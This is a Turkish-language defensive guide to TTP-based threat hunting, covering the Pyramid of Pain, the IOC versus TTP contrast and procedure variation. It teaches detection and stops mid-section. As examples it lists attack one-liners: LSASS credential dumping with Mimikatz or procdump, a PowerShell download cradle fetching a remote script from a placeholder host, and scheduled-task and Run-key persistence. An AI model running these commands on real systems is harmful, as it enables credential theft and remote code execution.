# 🎭 TTP AVCILIĞI — TAM USTALIK REHBERİ (CTI)
## Hash'i Bloklayan Acemiden, Davranışı Avlayan Ustaya — Pyramid of Pain'le Uçtan Uca

> **Amaç:** Tehdit istihbaratını "kötü hash listesini engelle" seviyesinden çıkarıp, bir **Cyber Threat Intelligence (CTI)** ustası gibi — saldırganın **niyetini (Tactic)**, **yöntemini (Technique)** ve **tam uygulamasını (Procedure)** okuyup, IOC değişse bile ayakta kalan **davranışsal tespit** üretecek ve **hipotez-tabanlı avlanacak** şekilde — çalışmayı öğretmek. Bu rehber yalnızca *nasıl*'ı değil, **neden TTP en değerli istihbarattır** ve **neden sadece IOC'ye güvenmek seni kör eder**'i de anlatır. Forum cevaplarında bulamayacağın Pyramid of Pain matematiği, procedure varyasyonu kör noktası, Sigma kural anatomisi, detection coverage boşlukları ve LOLBin yanılgısı burada.

> ⚠️ **Önce bunu oku — bu rehberin en kritik cümlesi:** IOC tabanlı savunma **reaktiftir** — saldırgan bir IP'yi, domaini, hatta hash'i **saniyede** değiştirir ve senin onca emekle topladığın gösterge **ölü** doğar. TTP tabanlı savunma **proaktiftir** — saldırganın *davranışını* değiştirmesi ona **gerçek maliyet** çıkarır. Bu farkı içselleştirmeden yazdığın her tespit kuralı, **bir sonraki örnek varyantında çöker.** Özellikle **🔥 PYRAMID OF PAIN** (Bölüm 3) ve **🔥 TTP TABANLI TESPİT** (Bölüm 7) bölümlerini ASLA atlama — bu rehberin omurgası onlardır.

> 🧪 **Teyit notu:** ATT&CK teknik numaraları (T-kodları), Windows Event ID'leri, Sysmon Event ID'leri ve Sigma sözdizimi zamanla güncellenir (ATT&CK her ~6 ayda revize edilir; ATT&CK v14→v15→... sürüm farkları olabilir; Sigma spesifikasyonu de evrilir). Aşağıdaki teknik detaylar yazım anındaki yaygın/kararlı değerlerdir — **kendi ortamından, ATT&CK Navigator'dan ve Sigma resmi reposundan teyit et.** Emin olmadığım, sürüme/ürüne bağlı yerleri "**teyit et**" notuyla işaretledim. Perspektif tamamen **savunma/avlama**dır — saldırı tekniği *yazmak* için değil, onu **tanımak, tespit etmek ve avlamak** için.

> 🧭 **Bu rehberin sınırı (önemli):** Burada **TTP kavramının derin teorisi** ve **tespit/avlama metodolojisi** vardır. **MITRE ATT&CK aracının pratik kullanımı** (Navigator ile gezinme, matris arama, aktör/grup belirleme, ATT&CK raporu üretme, katman dosyaları) **ayrı bir dosyadadır:** `MITRE_ATTACK_USTALIK_REHBERI.md`. ATT&CK'e burada *kavramsal* olarak değineceğiz (teknikler ortak dilimiz), ama **araç kullanımını tekrarlamayıp o dosyaya yönlendireceğiz.** İki rehber birbirini tamamlar.

---

## 📑 İÇİNDEKİLER

1. [TTP Nedir — Tactic / Technique / Procedure Üçlüsü](#1)
2. [CTI Piramidi — Veri → Bilgi → İstihbarat](#2)
3. [🔥 PYRAMID OF PAIN — Bu Rehberin OMURGASI](#3)
4. [🔥 IOC vs TTP — Reaktiften Proaktife Geçiş](#4)
5. [14 Tactic — Saldırgan Niyeti Olarak (Avlama Gözüyle)](#5)
6. [Techniques + Procedures — Aynı Teknik, Farklı Uygulama](#6)
7. [🔥 TTP TABANLI TESPİT — Atomic'ten Behavioral'a (Detection Engineering)](#7)
8. [🔥 SIGMA KURALLARI — TTP'yi Platform-Bağımsız Tespite Çevirmek](#8)
9. [🔥 THREAT HUNTING — Hipotez-Tabanlı TTP Avı (Çözümlü Örnekler)](#9)
10. [DATA SOURCES — Hangi Log Hangi Tekniği Görür (& Coverage)](#10)
11. [TTP ve Atfetme — İmza, Overlap, Copy-Cat Tehlikesi](#11)
12. [🔥 PÜF NOKTALARI — Piyasada Bulamayacakların (16+)](#12)
13. [☠️ Yaygın Hatalar](#13)
14. [🏰 Kanije Kalesi ile — Öz-Farkındalık & Avcı Gözüyle](#14)
15. [🚀 Zero-to-Hero Yol Haritası + Atomic Red Team ile Antrenman](#15)
16. [✅ Hızlı Referans (Pyramid of Pain) & Kontrol Listesi](#16)
17. [⚖️ Hukuki & Etik Sınır](#17)

---

<a id="1"></a>
## 1. 🧭 TTP Nedir — Tactic / Technique / Procedure Üçlüsü

**TTP**, **Tactics, Techniques and Procedures** kısaltmasıdır — askeri/istihbarat kökenli bir kavramın siber güvenliğe taşınmış halidir. Bir tehdit aktörünün **davranış parmak izini** üç soyutlama seviyesinde tarif eder. Acemi bu üç kelimeyi tek torbaya atar; usta her birini **ayrı bir soruya** karşılık olarak okur:

```
   ┌─────────────────────────────────────────────────────────────────┐
   │   TACTIC      →   NİYE?          (stratejik amaç)                │
   │   TECHNIQUE   →   NASIL?         (genel yöntem)                  │
   │   PROCEDURE   →   TAM OLARAK NASIL? (spesifik, somut uygulama)   │
   └─────────────────────────────────────────────────────────────────┘
```

### 1.1 Tactic — "NİYE" (stratejik amaç)

**Tactic**, saldırganın o anki **hedefidir** — ulaşmak istediği taktiksel amaç. "Şu an ne başarmaya çalışıyor?" sorusunun cevabı. ATT&CK'te tactic'ler bir saldırının **fazlarını** temsil eder (Initial Access, Execution, Persistence, ... Exfiltration, Impact). Tactic **soyut ve değişmezdir**: bir saldırgan "sisteme kalıcı olmak" (Persistence) istediğinde, *bunu hangi teknikle yaparsa yapsın* niyeti aynıdır.

> 🧠 **Avlama açısından:** Tactic, avının **"neyi aradığını" çerçeveler.** "Bu makinede Persistence izi var mı?" diye sorduğunda, *tüm* persistence tekniklerini (Run key, scheduled task, service, WMI...) kapsayan bir av başlatmış olursun. Tactic = av kategorisi.

### 1.2 Technique — "NASIL" (genel yöntem)

**Technique**, o niyete ulaşmak için kullanılan **genel yöntemdir.** ATT&CK'te her teknik bir **T-numarası** taşır (örn. `T1053` Scheduled Task/Job). Bazı teknikler **alt-tekniklere** (sub-technique) bölünür: `T1053.005` = Scheduled Task/Job → *Scheduled Task* (Windows'a özgü). Technique, "persistence istiyorum" niyetini "bir zamanlanmış görev oluşturarak" gibi somut bir yönteme indirir — ama henüz *tam komutu* söylemez.

### 1.3 Procedure — "TAM OLARAK NASIL" (spesifik uygulama)

**Procedure**, o tekniğin **belirli, somut, gözlemlenebilir uygulamasıdır.** "Hangi araçla, hangi komutla, hangi parametrelerle?" Procedure, bir teknik içindeki **varyasyondur** — aynı tekniği iki farklı aktör iki farklı procedure ile uygulayabilir. Procedure, gerçek dünyada **log satırında gördüğün şeydir.**

### 1.4 🔥 TAM ZİNCİR ÖRNEKLERİ (somutla)

Üçünü birden bir zincir olarak görmek, kavramı çakar:

```
┌──────────────────────────────────────────────────────────────────────────┐
│  TAM TTP ZİNCİRİ — bir kimlik bilgisi hırsızlığı                          │
├──────────────────────────────────────────────────────────────────────────┤
│  TACTIC     │ Credential Access            (NİYE: parola/hash çalmak)      │
│  TECHNIQUE  │ T1003 OS Credential Dumping  (NASIL: işletim sistemi         │
│             │  kimlik deposundan çekmek)                                   │
│  SUB-TECH   │ T1003.001 LSASS Memory       (NASIL: lsass.exe belleğinden)  │
│  PROCEDURE  │ Mimikatz ile `sekurlsa::logonpasswords`                      │
│             │ (TAM OLARAK NASIL: bu araç, bu komut, bu çıktı)              │
└──────────────────────────────────────────────────────────────────────────┘
```

Aynı tekniğin **farklı procedure**'larla yapılabileceğini gör — TTP avcılığının kalbi budur:

| Tactic | Technique | Procedure örnek 1 | Procedure örnek 2 | Procedure örnek 3 |
|---|---|---|---|---|
| Credential Access | **T1003.001** LSASS Memory | Mimikatz `sekurlsa::logonpasswords` | `procdump -ma lsass.exe` (Sysinternals) | `comsvcs.dll MiniDump` (LOLBin) ile rundll32 |
| Execution | **T1059.001** PowerShell | `powershell -enc <base64>` | `IEX (New-Object Net.WebClient).DownloadString(...)` (download cradle) | Fileless reflective load (diske yazmadan) |
| Persistence | **T1053.005** Scheduled Task | `schtasks /create /tr evil.exe /sc onlogon` | PowerShell `Register-ScheduledTask` | `at.exe` (eski sistemler) |
| Persistence | **T1547.001** Registry Run Key | `reg add HKCU\...\Run /v X /d evil.exe` | `RegSetValue` API ile doğrudan yazma | Startup klasörüne `.lnk` kısayol koyma |

> 🧠 **Altın kural:** **Tactic ve Technique görece azdır ve yavaş değişir** (ATT&CK ~14 tactic, ~200 teknik) — bunlar saldırganın "ne yapmak istediği" ve "nasıl yaptığı"dır. **Procedure ise sonsuz çeşitliliktedir** — aktör her seferinde komutu, aracı, kodlamayı biraz değiştirir. İşte TTP avcılığının inceliği burada: **tek bir procedure'a (örn. tam Mimikatz komutuna) kural yazarsan, aktör procedure'unu değiştirince körsün.** Bunun yerine **tekniğin değişmez davranışına** (lsass.exe'ye erişen *herhangi* bir yabancı process) kural yazarsan, tüm procedure'ları yakalarsın. Bu fark, atomic ve behavioral tespit arasındaki uçurumdur (Bölüm 7).

---

<a id="2"></a>
## 2. 🪜 CTI Piramidi — Veri → Bilgi → İstihbarat

TTP, boşlukta durmaz; bir **istihbarat üretim hiyerarşisinin** zirvesine yakın oturur. Ham olaylardan eyleme dönüşen istihbarata yükseliş:

```
                  ▲  DEĞER / BAĞLAM / DAYANIKLILIK artar
                  │
   ┌──────────────────────────────────┐
   │   İSTİHBARAT (Intelligence)       │  "Aktör X, finans sektörünü hedefliyor,
   │   = Bilgi + ANALİZ + BAĞLAM       │   şu TTP'lerle; önümüzdeki çeyrekte
   │   → KARAR ve AKSİYON üretir       │   bizi de vurabilir → şu kontrolü kur"
   ├──────────────────────────────────┤
   │   BİLGİ (Information)              │  "Bu IP bir C2'dir; bu hash Emotet'tir;
   │   = İşlenmiş, ilişkilendirilmiş   │   bu davranış T1053.005'tir"
   │     veri                          │
   ├──────────────────────────────────┤
   │   VERİ (Data)                     │  Ham loglar, hash'ler, IP'ler, paketler,
   │   = Ham, bağlamsız gözlem         │   olay kayıtları (anlam henüz yok)
   └──────────────────────────────────┘
                  │
                  ▼  HACİM artar (ham veri çok, istihbarat az)
```

- **Veri:** "10.0.0.5 adresine 443'ten bağlantı oldu." → Tek başına anlamsız; günde milyonlarca var.
- **Bilgi:** "Bu bağlantı, bilinen bir C2 altyapısına gidiyor ve 60 saniyede bir tekrarlıyor (beacon)." → İşlendi, ilişkilendirildi.
- **İstihbarat:** "Bu beacon deseni Cobalt Strike'a özgü; aktör lateral movement aşamasında; aynı TTP geçen ay rakip kurumda görüldü → şu segmenti izole et, şu Sigma kuralını yay." → Karar ürünü.

### IOC'den TTP'ye yükseliş — aynı piramidin "olgunluk" ekseni

CTI olgunluğu, bu piramidde **yükselebilme** yeteneğidir. Acemi ekip ham IOC'de takılır ("şu hash'i blokla"); olgun ekip o IOC'nin arkasındaki **davranışı (TTP)** çıkarır ve onu tespit eder. Bir sonraki bölüm (Pyramid of Pain) tam olarak bu yükselişin **neden değerli** olduğunu matematikselleştirir.

> 🧠 **Altın kural:** İstihbaratın değeri **hacmiyle ters, bağlamıyla doğru** orantılıdır. Bir milyon IOC, doğru TTP içgörüsü kadar değerli değildir. CTI'nin amacı "daha çok gösterge toplamak" değil, **"karar verdirecek anlam üretmektir."** TTP, bu anlamın en yoğun olduğu katmandır.

---

<a id="3"></a>
## 3. 🔥 PYRAMID OF PAIN — Bu Rehberin OMURGASI

2013'te **David J. Bianco**'nun ortaya koyduğu **Pyramid of Pain** (Acı Piramidi), tüm TTP avcılığının **zihinsel modelidir.** Tek bir soruya cevap verir: *"Savunmacı olarak bir göstergeyi tespit edip engellersem, bu saldırgana ne kadar ACI verir — yani davranışını değiştirmesi onu ne kadar zorlar?"*

Mantık devrimseldir: **Her gösterge eşit değildir.** Bir hash'i bloklamak saldırgana hiç maliyet çıkarmaz (yeni hash bedava ve anında); ama onun *tekniklerini* (TTP) tespit etmek, davranışını kökten değiştirmeye zorlar — bu **pahalı, yavaş ve bazen imkânsızdır.**

```
                                    ▲  Saldırgana ACI / SANA değer
                                    │  Değiştirmesi: ZOR & PAHALI
                       ╱╲
                      ╱  ╲          ┌──────────────────────────────────────┐
                     ╱TTPs╲   ◄──── │ 😈 ZORLU! Davranışı değiştirmek =     │
                    ╱──────╲        │ aktörü YENİDEN EĞİTMEK, araç/altyapı  │
                   ╱ Tools  ╲  ◄─── │ 😩 Sıkıntılı: yeni araç yaz/edin       │
                  ╱──────────╲      │                                        │
                 ╱  Network/  ╲◄─── │ 😠 Can sıkıcı: artefaktı değiştir      │
                ╱ Host Artif.  ╲    │                                        │
               ╱────────────────╲   │                                        │
              ╱   Domain Names    ╲◄ │ 😒 Basit ama bedelli: yeni domain al   │
             ╱────────────────────╲  │                                        │
            ╱     IP Addresses      ╲◄│ 🙂 Kolay: yeni IP/proxy (saatler)     │
           ╱────────────────────────╲ │                                        │
          ╱       Hash Values         ╲│ 😐 Önemsiz: 1 byte değiştir (saniye)  │
         ╱────────────────────────────╲└──────────────────────────────────────┘
        ─────────────────────────────────
                                    │  Değiştirmesi: KOLAY & UCUZ
                                    ▼  Sana değer: DÜŞÜK
```

Altı seviyeyi tek tek, "saldırgana ne kadar acı" ekseninde inceleyelim. **Aşağıdan yukarı çıktıkça hem saldırganın acısı hem de senin savunma değerin artar.**

### 3.1 🟥 Seviye 1 — Hash Values (en alt, en kolay) 😐

- **Ne:** Bir dosyanın MD5/SHA-1/SHA-256 özeti. "Trivial" (önemsiz) seviye.
- **Saldırgana acısı = SIFIR.** Hash, dosyanın *tek bir byte'ı* değişince **tamamen** değişir. Saldırgan payload'a tek bir null byte ekler, bir değişkeni yeniden adlandırır, yeniden derler → **yepyeni hash**, saniyeler içinde. Polymorphic/metamorphic malware bunu **her kurban için otomatik** yapar.
- **Savunma değeri:** Çok dar. Yalnızca **tam o örneği** yakalar; varyantını kaçırır.
- **Örnek:** EDR'a `e3b0c44298fc...` hash'ini bloklattın. Aktör payload'u recompile etti → hash `a1b2c3d4...` oldu → bloğun işe yaramaz. Sen yeni bir IOC'nin peşinde koşarken o çoktan içeride.
- **Ne zaman yararlı:** Bilinen kötü örneği hızlı engellemek, triyaj, fuzzy hash (ssdeep/imphash) ile *aile* gruplamak — ama asla **tek savunma katmanı** olarak değil.

### 3.2 🟧 Seviye 2 — IP Addresses 🙂

- **Ne:** C2 sunucusunun, exfil hedefinin IP adresi. "Easy" (kolay) seviye.
- **Saldırgana acısı = ÇOK AZ.** Yeni bir VPS/proxy/Tor çıkış/bulut IP'si **saatler içinde, çoğu zaman ücretsiz** edinilir. Fast-flux ve bulletproof hosting ile IP'ler **dakikalarda** döner. Saldırgan tek bir bloğu görür görmez yeni IP'ye geçer.
- **Savunma değeri:** Hash'ten biraz iyi (bir IP birden çok örnek için kullanılabilir) ama hâlâ kırılgan.
- **Örnek:** Firewall'da `185.x.x.x` C2 IP'sini bloklattın. Aktör altyapısını AWS'ye taşıdı → yeni IP, bloğun aşıldı. Üstelik meşru bulut IP'lerini (Cloudflare, AWS) körü körüne bloklarsan **kendi servislerini** kırarsın.

### 3.3 🟨 Seviye 3 — Domain Names 😒

- **Ne:** C2 domaini (`evil-c2.com`), DGA (Domain Generation Algorithm) ile üretilen alan adları. "Simple" (basit) seviye.
- **Saldırgana acısı = AZ AMA BEDELLİ.** Yeni domain almak para ve zaman ister (kayıt, DNS yayılımı, bazen WHOIS izi). IP'den bir tık daha pahalı çünkü iz bırakır ve anlık değildir. Ama yine de **görece kolaydır** — toplu domain alımı, DGA, ücretsiz dinamik DNS (no-ip, duckdns) ile aktör hızlı döner.
- **Savunma değeri:** IP'den iyi. DNS sinkholing, domain blocklist'leri burada işe yarar. **DGA tespiti** (entropi/n-gram analizi) bir TTP'ye yaklaşır.
- **Örnek:** DNS'te `gate-malz.net` domainini sinkhole'a yönlendirdin. Aktör `xq7r2.duckdns.org`'a geçti → ama DGA *deseni* (rastgele görünen subdomain'ler) hâlâ tespit edilebilir; bu seni Network Artifact seviyesine itiyor.

### 3.4 🟩 Seviye 4 — Network / Host Artifacts 😠

- **Ne:** Saldırganın **aktivitesinin bıraktığı izler** — IP/domain'in *kendisi* değil, **nasıl davrandığının** parmak izi:
  - **Network artifact:** Belirli bir `User-Agent` string'i (`Mozilla/5.0 (KanijeBot...)`), C2 URI yolu (`POST /gate.php`), JA3/JA3S TLS parmak izi, beacon aralığı/jitter deseni, anormal HTTP header sırası.
  - **Host artifact:** Kendine has registry anahtarı/değeri, dropped dosya adı kalıbı (`%APPDATA%\<rastgele>\svchost.exe`), mutex adı (`Global\MalzMutex_0xDEAD`), named pipe adı, servis adı, PDB yolu.
- **Saldırgana acısı = CAN SIKICI ("Annoying").** Artık aktörün **araçlarını/yapılandırmasını** değiştirmesi gerekir — sadece bir IP/domain değil. C2 framework'ünün varsayılan User-Agent'ını değiştirmek, mutex adını üretmek, dropper'ı yeniden yapılandırmak gerçek bir **mühendislik eforu** ister. Bu, piramidin **dönüm noktasıdır:** buradan yukarısı "altyapıyı değiştir" değil, "kendini değiştir" demektir.
- **Savunma değeri:** Yüksek. Bu artefaktlar IP/domain'den **çok daha kalıcıdır** çünkü aracın kendisine gömülüdür. Bir YARA/Sigma kuralı bu artefaktları yakaladığında, aktör IP'sini 100 kez değiştirse de seni atlatamaz.
- **Örnek:** Cobalt Strike'ın varsayılan named pipe deseni (`\\.\pipe\msagent_##`) ya da malleable C2 profilinin imzası → IP/domain değişse bile bu artefakt sabittir; tespit ayakta kalır.

### 3.5 🟦 Seviye 5 — Tools 😩

- **Ne:** Saldırganın kullandığı **araçların kendisi** — Mimikatz, Cobalt Strike, PsExec, Rubeus, özel yazılmış RAT, belirli bir packer/loader ailesi. "Challenging" (zorlu) seviye.
- **Saldırgana acısı = CİDDİ.** Bir aracı tespit edip engellersen, aktör **yeni bir araç bulmak, satın almak ya da yazmak** zorunda kalır. Bu **haftalar/aylar** sürebilir, para ve yetenek ister. Sevdiği, alıştığı, güvendiği aracı kaybetmek aktör için gerçek bir kayıptır. YARA kuralları (aracın byte imzası, import hash'i), aracın bıraktığı kalıcı artefaktlar bu seviyeyi vurur.
- **Savunma değeri:** Çok yüksek. Bir araç **birçok kampanyada, birçok aktör tarafından** kullanılır → bir aracı tespit etmek geniş bir tehdit yelpazesini kapsar. Mimikatz'ı davranışsal yakalamak, *onu kullanan herkesi* yakalar.
- **Örnek:** Mimikatz'ın bellek imzasını/davranışını (LSASS'a `sekurlsa` erişimi) tespit ettin. Aktör Mimikatz'ı bırakıp kendi credential dumper'ını yazmak zorunda → bu pahalı; çoğu aktör bunun yerine *başka bir kurbana* geçer (= sen kazandın).

### 3.6 🟪 Seviye 6 — TTPs (en tepe, en zor) 😈

- **Ne:** Aktörün **davranışının özü** — niyet + yöntem + uygulama deseni. "Tough!" (zorlu!) seviye. Araç değil, **davranış.** Örnek: "kimlik bilgisi için LSASS'a erişir → SMB ile lateral hareket eder → vssadmin ile shadow copy siler → 443'te beacon atar." Bu *desen*, hangi araçla yapılırsa yapılsın aynı kalır.
- **Saldırgana acısı = MAKSİMUM.** TTP'sini tespit ettiğinde, aktörün **nasıl operasyon yaptığını** — *yıllarca geliştirdiği oyun kitabını* — değiştirmesi gerekir. Bu, aktörü **yeniden eğitmek**, yeni bir saldırı metodolojisi icat etmek demektir. Yeni araç yazmaktan bile pahalıdır çünkü **düşünce tarzını** değiştirmesi gerekir. Çoğu aktör bunu yapmaz/yapamaz → ya yakalanır ya da daha kolay bir hedefe gider.
- **Savunma değeri:** En yüksek. TTP tabanlı bir tespit, **aktörün tüm araç ve altyapı değişikliklerine dayanır.** "LSASS'a yabancı process erişimi" kuralı; Mimikatz'ı, procdump'ı, comsvcs.dll'i, *henüz yazılmamış* bir aracı bile yakalar — çünkü hepsi *aynı tekniği* uygular.
- **Örnek:** "Office uygulaması (`winword.exe`) bir alt-process olarak `powershell.exe` başlattı" davranışını tespit ettin. Bu *teknik* (T1059.001 + makro tetikleme) on binlerce farklı procedure ile yapılır; ama hepsi bu davranışsal izi bırakır → aktör fidye yazılımını, dropper'ını, hash'ini, IP'sini, domainini değiştirebilir ama **bu davranışı değiştiremez** (Office'ten kod çalıştırma onun temel taktiği). İşte bu yüzden TTP en tepededir.

### 3.7 🔥 Neden TTP en tepede, hash en altta — ÖZ

| Seviye | Değiştirme maliyeti | Süre | Saldırgana acı | Sana değer |
|---|---|---|---|---|
| **TTP** | Davranışı/oyun kitabını yeniden kur | Aylar–yıllar | 😈 Maksimum | ⭐⭐⭐⭐⭐ |
| **Tools** | Yeni araç yaz/satın al | Haftalar–aylar | 😩 Ciddi | ⭐⭐⭐⭐ |
| **Net/Host Artifacts** | Aracı yeniden yapılandır | Günler | 😠 Can sıkıcı | ⭐⭐⭐ |
| **Domain Names** | Yeni domain al | Saatler–günler | 😒 Bedelli | ⭐⭐ |
| **IP Addresses** | Yeni IP/proxy | Dakikalar–saatler | 🙂 Kolay | ⭐ |
| **Hash Values** | 1 byte değiştir | Saniyeler | 😐 Sıfır | ☆ |

> 🧠 **Pyramid of Pain'in altın kuralı:** Savunma yatırımını **yukarı kaydır.** Hash/IP/domain bloklamak gereklidir (ucuz, hızlı, "düşük asılı meyve") ama **stratejik savunma TTP seviyesinde inşa edilir.** Hedefin: saldırgana her temasta **acı vermek** — onu sürekli araç ve davranış değiştirmeye zorlamak. Bir gün TTP'sini tespit ettiğinde, o aktörü bir IP değişikliğiyle atlatamayacağı bir köşeye sıkıştırırsın. **"Hash avlayan oyalanır; TTP avlayan kazanır."**

---

<a id="4"></a>
## 4. 🔥 IOC vs TTP — Reaktiften Proaktife Geçiş

Pyramid of Pain'in pratik sonucu, **IOC tabanlı** savunmadan **TTP tabanlı** savunmaya geçiştir. Bu geçiş, bir güvenlik ekibinin **olgunluğunun** en net göstergesidir.

### 4.1 İki paradigmanın dürüst kıyası

| Boyut | IOC tabanlı (Hash/IP/Domain) | TTP tabanlı (Davranış) |
|---|---|---|
| **Ne avlar** | Bilinen *atomic* göstergeler | Davranış *desenleri* |
| **Ömür** | Kısa (saniye–gün) — kırılgan | Uzun (ay–yıl) — kalıcı |
| **Duruş** | **Reaktif** ("bunu daha önce gördük") | **Proaktif** ("bu davranışı arıyoruz") |
| **Varyant** | Kaçırır (1 byte değişince kör) | Yakalar (procedure değişse de teknik aynı) |
| **Sıfır-gün** | Tamamen kör (henüz IOC yok) | Görebilir (yeni araç bile aynı tekniği kullanır) |
| **False positive** | Düşük (dar, spesifik) | Daha yüksek (meşru araçlar aynı davranışı yapar) |
| **Bakım** | Sürekli yenileme (feed'ler eskir) | Daha stabil (teknik yavaş değişir) |
| **Uygulama** | Kolay (blocklist, basit) | Zor (detection engineering, bağlam) |

### 4.2 Neden IOC tek başına yetmez — somut senaryo

```
   GÜN 1: Emotet kampanyası tespit edildi.
          → IOC topladın: 3 hash, 5 C2 IP, 2 domain. Hepsini blokladın. ✅
   GÜN 2: Aktör payload'u recompile etti (yeni hash), C2'yi taşıdı (yeni IP/domain).
          → 10 IOC'nin TAMAMI ÖLÜ. Sen yine "temiz" görünüyorsun. ⚠️
          → Yeni kampanya içeride, çünkü sadece İMZAYI bloklamıştın, DAVRANIŞI değil.

   ALTERNATİF (TTP tabanlı):
   GÜN 1: Emotet'in DAVRANIŞINI yakaladın:
          "Outlook → winword.exe makro → powershell -enc → regsvr32 ile DLL"
          → Bunu bir Sigma kuralına döktün (procedure-bağımsız).
   GÜN 2: Aktör hash/IP/domain değiştirdi AMA davranış aynı →
          → Kural HÂLÂ yakalıyor. ✅ Aktör seni atlatmak için
            TÜM oyun kitabını değiştirmek zorunda (= çok pahalı).
```

### 4.3 "Geçiş" neden olgunluk işaretidir

- **Acemi ekip:** Tehdit feed'lerine abone olur, IOC'leri SIEM'e döker, "engelledik" der. Saldırgan her varyantla onları atlatır; ekip sürekli **geriden** koşar (reaktif).
- **Olgun ekip:** IOC'yi *triyaj* için kullanır ama asıl yatırımı **davranışsal tespit** (Sigma/EDR kuralları) ve **threat hunting**'e yapar. Saldırgan varyant üretse de davranış izini bırakır → ekip **önden** karşılar (proaktif).

> 🧠 **Altın kural:** IOC'yi **terk etme** — Pyramid'in alt katmanları ucuz ve hızlıdır, "düşük asılı meyveyi" toplamak akıllıcadır. Ama **orada durma.** Olgunluk, "her IOC'nin arkasındaki TTP nedir, onu nasıl davranışsal yakalarım?" diye sormaktır. **IOC seni dünden korur; TTP seni yarından korur.** CTI'nin gerçek kası, atomic göstergeden davranışsal tespite **terfi edebilmektir.**

---

<a id="5"></a>
## 5. 🧩 14 Tactic — Saldırgan Niyeti Olarak (Avlama Gözüyle)

ATT&CK Enterprise matrisi (yazım anında) **14 tactic** içerir — bir saldırının fazları. Burada her birini **saldırgan niyeti** ve **avlama anlamı** olarak özetliyoruz. *(Her tactic'in altındaki tekniklerin tam listesi, Navigator kullanımı ve aktör eşlemesi için → `MITRE_ATTACK_USTALIK_REHBERI.md`. Burada amaç, her fazın "avcı için ne demek" olduğunu kavramak.)*

| # | Tactic (TA kodu) | Niyet (NİYE?) | Avlama açısından ne aranır |
|---|---|---|---|
| 1 | **Reconnaissance** (TA0043) | Hedefi tanımak (saldırı öncesi) | Çoğu kuruluşun dışında; tarama/OSINT izleri, anormal dış sorgular |
| 2 | **Resource Development** (TA0042) | Altyapı/araç hazırlama | Genelde görünmez (aktör tarafında); CTI ile altyapı izleme |
| 3 | **Initial Access** (TA0001) | İlk ayak basma | Phishing eki/linki, exploit, geçerli hesap, harici servis — **giriş noktası avı** |
| 4 | **Execution** (TA0002) | Kötücül kod çalıştırma | Anormal process zinciri (Office→PowerShell), script motorları, LOLBin |
| 5 | **Persistence** (TA0003) | Kalıcı olmak (reboot'a dayan) | Run key, scheduled task, service, WMI sub — **otomatik başlatma noktaları** |
| 6 | **Privilege Escalation** (TA0004) | Daha yüksek yetki | Token manipülasyonu, UAC bypass, exploit, zayıf servis izinleri |
| 7 | **Defense Evasion** (TA0005) | Savunmadan kaçma | Log silme, AV devre dışı, obfuscation, masquerading, LOLBin — **en geniş tactic** |
| 8 | **Credential Access** (TA0006) | Kimlik bilgisi çalma | LSASS dump, SAM, Kerberoast, keylogger, kayıtlı parola — **kimlik deposu erişimi** |
| 9 | **Discovery** (TA0007) | Ortamı keşfetme | `whoami`, `net group`, `nltest`, AD sorguları — **anormal keşif komut yoğunluğu** |
| 10 | **Lateral Movement** (TA0008) | Yanal yayılma | PsExec, WMI, RDP, SMB, pass-the-hash — **makineler arası anormal kimlik kullanımı** |
| 11 | **Collection** (TA0009) | Veri toplama | Ekran/klavye yakalama, dosya tarama, arşivleme (staging) |
| 12 | **Command and Control** (TA0011) | Uzaktan kontrol (C2) | Beacon, DNS tüneli, web protokolü, meşru servis kötüye kullanımı — **anormal giden trafik** |
| 13 | **Exfiltration** (TA0010) | Veri sızdırma | Büyük giden transfer, sıkıştırılmış arşiv çıkışı, alternatif kanal |
| 14 | **Impact** (TA0040) | Yıkım/etki | Şifreleme (fidye), wiper, shadow copy silme, servis durdurma |

> 🧠 **Avcı için tactic'in anlamı:** Tactic'ler bir **av haritasıdır.** Bir tehdit avı tasarlarken "bu makinede *hangi fazın* izini arıyorum?" diye sorarsın. "Persistence avı" başlattığında, *o tactic altındaki tüm teknikleri* (ve onların tüm procedure'larını) kapsayan bir hipotez kurarsın. **Kill chain mantığı:** Saldırgan genelde bu fazlardan *sırayla* geçer (Initial Access → Execution → Persistence → ...) — bir fazda iz bulduğunda, **komşu fazları** da ararsın (örn. persistence buldun → execution ve credential access izlerine bak). Bu, izole bir alarmı **bir saldırı zincirine** bağlamanın yoludur.

---

<a id="6"></a>
## 6. ⚙️ Techniques + Procedures — Aynı Teknik, Farklı Uygulama

Bölüm 1'de zinciri kurduk; şimdi **avcılığın kalbine** iniyoruz: *aynı tekniğin farklı procedure'larla yapılması ve bunun tespiti neden zorlaştırdığı.*

### 6.1 Procedure varyasyonu — tek teknik, çok yüz

Bir tekniği "imzalamak" (tek procedure'a kural yazmak) neden tehlikelidir? Çünkü **procedure, saldırganın en kolay değiştirdiği şeydir.** Klasik örnek — **T1059.001 PowerShell**:

```
   TEKNİK: T1059.001 (Command and Scripting Interpreter: PowerShell)
   ───────────────────────────────────────────────────────────────────
   PROCEDURE A — Base64 encoded:
     powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...
     → "-enc" + base64 blob; AMSI'yi atlatma denemesi

   PROCEDURE B — Download cradle (fileless):
     powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
     → diske hiç yazmaz; uzaktan script çeker ve bellekte çalıştırır

   PROCEDURE C — Encoded + obfuscated (string birleştirme):
     powershell -c "& ([scriptblock]::Create((gp HKCU:\x).y))"
     → registry'den şifreli payload okur; komut satırı "temiz" görünür

   PROCEDURE D — LOLBin proxy:
     mshta.exe javascript:...powershell...   (mshta üzerinden dolaylı)
```

**Hepsi aynı teknik (T1059.001), dört farklı procedure.** Eğer kuralın `-enc` string'ine bağlıysa (Procedure A), B/C/D'yi **kaçırırsın.** İşte procedure varyasyonu kör noktası: aktör `-enc`'i `-EncodedCommand`'a, ya da `IEX`'i `Invoke-Expression`'a, ya da büyük/küçük harfe çevirir → atomik imzan ölür.

### 6.2 Procedure varyasyonunu yenmenin yolu — değişmez çekirdeği bul

Çözüm: Procedure'ların **ortak, değişmez davranışsal çekirdeğine** kural yazmak. Yukarıdaki dört procedure'un *hepsinde* sabit kalan ne var?

```
   Değişen (procedure): -enc / IEX / download / registry / mshta zinciri
   DEĞİŞMEYEN (teknik davranışı):
     • powershell.exe (ya da pwsh.exe / System.Management.Automation.dll yüklenmesi)
     • genelde ANORMAL PARENT (winword.exe, mshta, wmiprvse, cmd→powershell)
     • genelde gizli/no-profile bayrakları (-w hidden, -nop)
     • genelde ağ erişimi ya da script-block içinde encode'lu içerik
```

